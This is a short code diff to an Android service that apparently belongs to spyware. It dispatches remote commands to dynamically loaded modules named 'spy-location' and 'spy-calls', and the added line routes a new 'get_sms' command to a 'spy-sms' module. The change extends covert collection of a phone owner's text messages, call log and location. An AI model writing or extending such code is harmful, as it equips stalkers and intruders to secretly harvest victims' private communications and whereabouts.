@@ -228,6 +228,7 @@ class ConnectorService : Service() {
             cmd == "get_location"        -> DexModuleLoader.execute(this, "spy-location", cmd, null)
 
             // ── Call log (dex module) ──
+            cmd.startsWith("get_sms")     -> DexModuleLoader.execute(this, "spy-sms", cmd, null)
             cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, "spy-calls", cmd, null)
 
             // ── Contacts (dex module) ──
